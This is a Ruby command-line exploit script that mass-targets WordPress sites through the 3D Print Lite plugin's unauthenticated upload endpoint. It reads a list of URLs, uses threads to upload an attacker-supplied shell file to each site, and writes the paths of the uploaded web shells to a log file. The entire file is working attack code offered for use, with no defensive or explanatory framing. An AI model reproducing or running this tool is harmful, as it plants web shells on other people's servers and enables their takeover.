require 'optparse'
require 'httparty'
require 'eventmachine'
require 'uri'

class D3_Print_Exploit
  def initialize
    @params = {
      input_file: nil,
      shell_file: nil,
      output_file: 'output.txt',
    }

    @vuln_urls = []
    @threads = []

    @headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
    }
  end

  def check_site(domain)
    target_domain = URI.parse(domain)
    plugin_url = "#{target_domain.scheme}://#{target_domain.host}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload"

    begin
      response = HTTParty.post(plugin_url, headers: @headers, timeout: 3)

      if response.body.include?("jsonrpc")
        response_shell = HTTParty.post(plugin_url, body: { 'file' => File.new(@params[:shell_file]) })

        if response_shell.body.include?(File.basename(@params[:shell_file]))
          File.open(@params[:output_file], "a+") do |file_manager|
            file_manager.puts("#{target_domain.scheme}://#{target_domain.host}/wp-content/uploads/p3d/#{File.basename(@params[:shell_file])}")
          end

          puts("#{plugin_url} --> Uploaded".green)
        else
          puts("#{plugin_url} --> Not Vuln".red)
        end
      else
        puts("#{plugin_url} --> Not Vuln".red)
      end
    rescue Net::OpenTimeout
      puts("#{plugin_url} --> Not Vuln".red)
    rescue StandardError
      puts("#{plugin_url} --> Not Vuln".red)
    end
  end

  def print_help
    help_text = <<-'HELP_TEXT'
USAGE: ruby upload_checker.rb [options]

OPTIONS:
  -i, --input_file INPUT_FILE: Define the path to the URL file.
  -o, --output_file OUTPUT_FILE: Define the name of the output log file.
  -s, --shell_file SHELL_FILE: Define the path of the shell file.
    HELP_TEXT

    puts(help_text.magenta)
  end

  def opt_parser
    begin
      OptionParser.new do |opts|
        opts.on "-i", "--input_file INPUT_FILE" do |input_file|
          if File.exist?(input_file)
            @params[:input_file] = input_file
          else
            puts("File not found: #{input_file}".red)
            exit(1)
          end
        end

        opts.on "-s", "--shell_file INPUT_FILE" do |shell_file|
          if File.exist?(shell_file)
            @params[:shell_file] = shell_file
          else
            puts("Shell File not found: #{shell_file}".red)
            exit(1)
          end
        end

        opts.on "-o", "--output_file OUTPUT_FILE" do |output_file|
          @params[:output_file] = output_file
        end
      end.parse!
    rescue Exception => exception
      puts("Error: #{exception}")
    end
  end

  def parse_lines(group)
    group.each do |line|
      check_site(line.strip)
    end
  end

  def main
    opt_parser

    unless @params[:input_file].nil? and @params[:shell_file].nil?
      lines = File.readlines(@params[:input_file])

      lines.each_slice(4) do |group_lines|
        @threads << Thread.new { parse_lines(group_lines) }
      end

      @threads.each(&:join)
      puts()
      puts("Exploit completed.".magenta)

      EM.stop
    else
      print_help
      EM.stop
    end
  end
end

class String
  def red
    "\e[31m#{self}\e[0m"
  end

  def green
    "\e[32m#{self}\e[0m"
  end

  def magenta
    "\e[35m#{self}\e[0m"
  end
end

EM.run do
  EM.defer do
    exploit = D3_Print_Exploit.new
    exploit.main
  end
end
